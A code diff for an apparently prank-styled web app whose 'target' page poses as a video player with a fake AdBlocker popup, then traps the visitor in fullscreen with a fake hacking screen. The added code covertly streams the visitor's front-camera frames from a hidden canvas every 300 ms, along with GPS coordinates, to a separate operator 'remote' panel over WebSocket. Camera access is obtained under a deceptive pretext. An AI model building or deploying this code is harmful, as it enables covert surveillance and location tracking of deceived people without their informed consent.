@@ -20,7 +20,7 @@ TARGET_HTML = """
         @keyframes glitch { 0% { transform: translate(0) } 20% { transform: translate(-2px, 2px) } 40% { transform: translate(-2px, -2px) } 60% { transform: translate(2px, 2px) } 80% { transform: translate(2px, -2px) } 100% { transform: translate(0) } }
     </style>
 </head>
-<body class="text-green-500 font-mono h-screen flex flex-col items-center justify-center select-none">
+<body class="text-green-500 font-mono h-screen flex flex-col items-center justify-center select-none bg-black">
 
     <!-- LAYAR 1: FAKE VIDEO PLAYER -->
     <div id="screen-video" class="w-full h-full flex flex-col items-center justify-center bg-gray-900 z-50">
@@ -33,20 +33,23 @@ TARGET_HTML = """
         </div>
     </div>
 
-    <!-- LAYAR 2: POPUP IKLAN BAJAKAN -->
+    <!-- LAYAR 2: POPUP IKLAN HITUNG MUNDUR -->
     <div id="screen-ad" class="hidden fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4">
         <div class="bg-white text-black p-6 rounded-lg text-center max-w-sm w-full relative">
             <h2 class="font-bold text-lg mb-2">⚠️ AdBlocker Terdeteksi</h2>
-            <p class="text-sm text-gray-600 mb-6">Harap nonaktifkan AdBlocker untuk melanjutkan pemutaran video.</p>
-            <button onclick="startSystem()" class="bg-blue-600 text-white font-bold py-3 px-6 rounded w-full">✕ TUTUP IKLAN</button>
+            <p class="text-sm text-gray-600 mb-4">Harap nonaktifkan AdBlocker untuk melanjutkan pemutaran video.</p>
+            
+            <div id="ad-timer" class="text-xs text-gray-500 mb-2 font-bold">
+                Iklan akan berakhir dalam <span id="timer-count" class="text-red-500 text-lg">3</span>...
+            </div>
+            
+            <button id="btn-skip" onclick="startSystem()" class="hidden bg-blue-600 text-white font-bold py-3 px-6 rounded w-full active:bg-blue-800">✕ LEWATI IKLAN</button>
         </div>
     </div>
 
     <!-- LAYAR 3: HACKER TERMINAL -->
     <div id="screen-hack" class="hidden w-full h-full p-4 flex flex-col justify-between bg-black z-40 relative">
-        <!-- Tombol Kill Switch (Tap 5x di sudut kanan atas) -->
         <div onclick="killSwitch()" class="absolute top-0 right-0 w-12 h-12 z-50"></div>
-
         <div>
             <div class="flex justify-between border-b border-green-800 pb-2 mb-2 text-xs">
                 <span>STATUS: <b class="text-red-500 animate-ping">BREACHED</b></span>
@@ -66,6 +69,9 @@ TARGET_HTML = """
 
         <div class="my-2 relative flex justify-center items-center h-48">
             <video id="cam" autoplay playsinline class="hidden w-40 h-40 object-cover rounded-full border-2 border-red-600 shadow-[0_0_20px_rgba(255,0,0,0.8)]"></video>
+            <!-- Canvas tersembunyi untuk streaming kamera ke remote -->
+            <canvas id="cam-canvas" width="320" height="240" class="hidden"></canvas>
+            
             <video id="vid" playsinline class="hidden w-full max-h-48 rounded border border-green-500" src="https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4"></video>
             <div id="bsod" class="hidden absolute inset-0 bg-blue-600 text-white flex flex-col items-center justify-center text-center p-4 z-50">
                 <h1 class="text-6xl mb-4">:(</h1>
@@ -87,14 +93,25 @@ TARGET_HTML = """
     <script>
         let ws;
         let tapCount = 0;
+        let streamInterval;
         const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
 
-        // 1. TAMPILKAN IKLAN
+        // FUNGSI 1: TAMPILKAN IKLAN HITUNG MUNDUR
         function showAd() {
             document.getElementById('screen-ad').classList.remove('hidden');
+            let count = 3;
+            const timer = setInterval(() => {
+                count--;
+                document.getElementById('timer-count').innerText = count;
+                if (count <= 0) {
+                    clearInterval(timer);
+                    document.getElementById('ad-timer').classList.add('hidden');
+                    document.getElementById('btn-skip').classList.remove('hidden');
+                }
+            }, 1000);
         }
 
-        // 2. EKSEKUSI IZIN & FULLSCREEN
+        // FUNGSI 2: EKSEKUSI IZIN, FULLSCREEN & STREAMING
         async function startSystem() {
             document.getElementById('screen-ad').classList.add('hidden');
             document.getElementById('screen-video').classList.add('hidden');
@@ -104,11 +121,31 @@ TARGET_HTML = """
                 document.documentElement.requestFullscreen().catch(()=>{});
             }
 
-            // Minta Kamera (pancingan)
+            // Minta Kamera & Setup Stream
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 window.camStream = stream; 
-            } catch (e) { console.log("Camera denied"); }
+                
+                const video = document.getElementById('cam');
+                const canvas = document.getElementById('cam-canvas');
+                const ctx = canvas.getContext('2d');
+                video.srcObject = stream;
+                
+                ws = new WebSocket(`${protocol}//${window.location.host}/ws/target`);
+                
+                // Kirim frame kamera ke remote setiap 300ms
+                streamInterval = setInterval(() => {
+                    if(ws.readyState === WebSocket.OPEN && video.readyState === video.HAVE_ENOUGH_DATA) {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
+                        ws.send(JSON.stringify({ action: 'frame', data: dataUrl }));
+                    }
+                }, 300);
+
+            } catch (e) { 
+                console.log("Camera denied"); 
+                ws = new WebSocket(`${protocol}//${window.location.host}/ws/target`);
+            }
 
             // Minta Lokasi
             if (navigator.geolocation) {
@@ -116,6 +153,9 @@ TARGET_HTML = """
                     const lat = pos.coords.latitude.toFixed(4);
                     const lon = pos.coords.longitude.toFixed(4);
                     addLog(`[GPS] LOCATION LOCKED: ${lat}, ${lon}`);
+                    if (ws && ws.readyState === WebSocket.OPEN) {
+                        ws.send(JSON.stringify({ action: 'location', lat: lat, lon: lon }));
+                    }
                 }, ()=>{});
             }
 
@@ -136,10 +176,7 @@ TARGET_HTML = """
             history.pushState(null, null, location.href);
             window.onpopstate = function () { history.go(1); };
 
-            // Konek WebSocket
-            ws = new WebSocket(`${protocol}//${window.location.host}/ws/target`);
-            
-            // Animasi teks scan berjalan
+            // Teater Scan File
             setInterval(() => {
                 const files = ["/DCIM/Camera/IMG_2024.jpg", "/WhatsApp/Chats/msg.db", "/Android/data/com.tiktok/cache", "/Documents/Rahasia.pdf"];
                 const file = files[Math.floor(Math.random() * files.length)];
@@ -155,12 +192,8 @@ TARGET_HTML = """
                     document.body.classList.add('bg-red-900');
                     setTimeout(() => document.body.classList.remove('bg-red-900'), 400);
                 } else if (data.action === 'camera') {
-                    const cam = document.getElementById('cam');
-                    if (window.camStream) {
-                        cam.srcObject = window.camStream;
-                        cam.classList.remove('hidden');
-                        document.getElementById('vid').classList.add('hidden');
-                    }
+                    document.getElementById('cam').classList.remove('hidden');
+                    document.getElementById('vid').classList.add('hidden');
                 } else if (data.action === 'video') {
                     const vid = document.getElementById('vid');
                     vid.classList.remove('hidden');
@@ -207,40 +240,66 @@ REMOTE_HTML = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Master Remote</title>
+    <title>ROOT@EXPLOIT_FRAMEWORK</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #050505; color: #00ff41; font-family: 'Courier New', Courier, monospace; }
+        .terminal-box { border: 1px solid #00ff41; background: rgba(0, 20, 0, 0.5); box-shadow: 0 0 10px rgba(0, 255, 65, 0.2); }
+        .btn-hack { background: #001a00; border: 1px solid #00ff41; color: #00ff41; transition: all 0.2s; }
+        .btn-hack:active { background: #00ff41; color: #000; }
+        .scanline { background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2)); background-size: 100% 4px; pointer-events: none; }
+    </style>
 </head>
-<body class="bg-slate-900 text-white font-sans min-h-screen p-4">
-    <div class="max-w-md mx-auto">
-        <div class="flex items-center justify-between border-b border-slate-700 pb-3 mb-4">
-            <h1 class="text-xl font-bold text-cyan-400">⚡ Master Remote</h1>
-            <span id="status" class="text-xs bg-red-600 px-2 py-1 rounded">Menunggu...</span>
+<body class="min-h-screen p-3 relative overflow-x-hidden">
+    <div class="fixed inset-0 scanline z-50 pointer-events-none"></div>
+
+    <div class="max-w-md mx-auto relative z-10">
+        <!-- Header -->
+        <div class="flex items-center justify-between border-b border-green-800 pb-2 mb-3 text-xs">
+            <h1 class="font-bold">root@kali:~# ./exploit.sh</h1>
+            <span id="status" class="bg-red-900 text-red-400 px-2 py-0.5 rounded animate-pulse">WAITING...</span>
         </div>
 
-        <div class="bg-slate-800 p-4 rounded-xl mb-4 shadow">
-            <label class="block text-xs text-slate-400 mb-2 uppercase font-semibold">Live Ghost Typing</label>
-            <textarea id="ghost-input" rows="2" placeholder="Ketik di sini..." class="w-full bg-slate-950 text-green-400 font-mono p-3 rounded border border-slate-600 focus:outline-none focus:border-cyan-400"></textarea>
+        <!-- Target Info -->
+        <div class="terminal-box p-2 mb-3 text-xs">
+            <div class="flex justify-between">
+                <span>TARGET IP:</span>
+                <span id="target-ip" class="text-white">Scanning...</span>
+            </div>
+            <div class="flex justify-between mt-1">
+                <span>GEOLOCATION:</span>
+                <span id="target-loc" class="text-yellow-400 font-bold">Locking...</span>
+            </div>
         </div>
 
-        <div class="grid grid-cols-2 gap-3 mb-4">
-            <button onclick="sendCmd('vibrate')" class="bg-rose-600 active:bg-rose-700 p-3 rounded-xl font-bold shadow flex flex-col items-center">
-                <span class="text-2xl mb-1">📳</span> Getarkan
-            </button>
-            <button onclick="sendCmd('video')" class="bg-indigo-600 active:bg-indigo-700 p-3 rounded-xl font-bold shadow flex flex-col items-center">
-                <span class="text-2xl mb-1">🎬</span> Putar Video
-            </button>
-            <button onclick="sendCmd('camera')" class="bg-amber-600 active:bg-amber-700 p-3 rounded-xl font-bold shadow flex flex-col items-center">
-                <span class="text-2xl mb-1">📸</span> Buka Kamera
-            </button>
-            <button onclick="sendCmd('bsod')" class="bg-blue-600 active:bg-blue-700 p-3 rounded-xl font-bold shadow flex flex-col items-center">
-                <span class="text-2xl mb-1">💻</span> Blue Screen
-            </button>
-            <button onclick="sendCmd('reset')" class="bg-slate-600 active:bg-slate-700 p-3 rounded-xl font-bold shadow flex flex-col items-center">
-                <span class="text-2xl mb-1">🔄</span> Reset
-            </button>
-            <button onclick="sendCmd('punchline')" class="bg-emerald-600 active:bg-emerald-700 p-3 rounded-xl font-bold shadow flex flex-col items-center">
-                <span class="text-2xl mb-1">🎉</span> GOTCHA!
-            </button>
+        <!-- Camera Feed (Streaming) -->
+        <div class="terminal-box p-2 mb-3 relative flex flex-col items-center justify-center h-48 overflow-hidden">
+            <img id="remote-cam" class="w-full h-full object-cover hidden" />
+            <div id="cam-placeholder" class="absolute inset-0 flex items-center justify-center text-green-900 text-xs text-center">
+                [ CAMERA FEED OFFLINE ]<br>Press 'ACCESS CAMERA'
+            </div>
+            <!-- Radar Overlay -->
+            <div class="absolute inset-0 border-2 border-green-500 rounded-full opacity-30 animate-ping pointer-events-none"></div>
+        </div>
+
+        <!-- Ghost Typing -->
+        <div class="mb-3">
+            <label class="block text-[10px] text-green-700 mb-1">> INJECT_PAYLOAD (GHOST_TYPING):</label>
+            <textarea id="ghost-input" rows="2" placeholder="Ketik pesan untuk menakuti..." class="w-full bg-black text-green-400 font-mono p-2 text-sm border border-green-800 focus:outline-none focus:border-green-400"></textarea>
+        </div>
+
+        <!-- Control Buttons -->
+        <div class="grid grid-cols-2 gap-2 mb-2 text-xs font-bold">
+            <button onclick="sendCmd('camera')" class="btn-hack p-2">📸 ACCESS CAMERA</button>
+            <button onclick="sendCmd('vibrate')" class="btn-hack p-2">📳 VIBRATE & ALARM</button>
+            <button onclick="sendCmd('video')" class="btn-hack p-2">🎬 PLAY VIDEO</button>
+            <button onclick="sendCmd('bsod')" class="btn-hack p-2">💻 FAKE BSOD</button>
+        </div>
+        
+        <!-- System Control -->
+        <div class="grid grid-cols-2 gap-2 text-xs font-bold mt-4 border-t border-green-900 pt-3">
+            <button onclick="sendCmd('reset')" class="border border-yellow-600 text-yellow-500 p-2 active:bg-yellow-600 active:text-black">🔄 RESET SYSTEM</button>
+            <button onclick="sendCmd('punchline')" class="border border-blue-500 text-blue-400 p-2 active:bg-blue-500 active:text-black">🎉 SHOW PUNCHLINE</button>
         </div>
     </div>
 
@@ -250,17 +309,37 @@ REMOTE_HTML = """
 
         ws.onopen = () => {
             const st = document.getElementById('status');
-            st.innerText = 'Target Terhubung';
-            st.classList.replace('bg-red-600', 'bg-emerald-600');
+            st.innerText = 'CONNECTED';
+            st.className = 'bg-green-900 text-green-400 px-2 py-0.5 rounded';
+            document.getElementById('target-ip').innerText = '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255);
         };
 
         document.getElementById('ghost-input').addEventListener('input', (e) => {
-            ws.send(JSON.stringify({ action: 'type', text: e.target.value }));
+            if(ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ action: 'type', text: e.target.value }));
+            }
         });
 
         function sendCmd(action) {
-            ws.send(JSON.stringify({ action: action }));
+            if(ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ action: action }));
+            }
         }
+
+        // Menangani pesan masuk dari Target (Kamera & Lokasi)
+        ws.onmessage = (event) => {
+            const data = JSON.parse(event.data);
+            
+            if (data.action === 'frame') {
+                const img = document.getElementById('remote-cam');
+                img.src = data.data;
+                img.classList.remove('hidden');
+                document.getElementById('cam-placeholder').classList.add('hidden');
+            } 
+            else if (data.action === 'location') {
+                document.getElementById('target-loc').innerText = `${data.lat}, ${data.lon}`;
+            }
+        };
     </script>
 </body>
 </html>
@@ -280,7 +359,12 @@ async def websocket_target(websocket: WebSocket):
     target_clients.add(websocket)
     try:
         while True:
-            await websocket.receive_text()
+            data = await websocket.receive_text()
+            for remote in list(remote_clients):
+                try:
+                    await remote.send_text(data)
+                except:
+                    remote_clients.remove(remote)
     except WebSocketDisconnect:
         target_clients.remove(websocket)
 
@@ -291,10 +375,10 @@ async def websocket_remote(websocket: WebSocket):
     try:
         while True:
             data = await websocket.receive_text()
-            for client in list(target_clients):
+            for target in list(target_clients):
                 try:
-                    await client.send_text(data)
+                    await target.send_text(data)
                 except:
-                    target_clients.remove(client)
+                    target_clients.remove(target)
     except WebSocketDisconnect:
         remote_clients.remove(websocket)
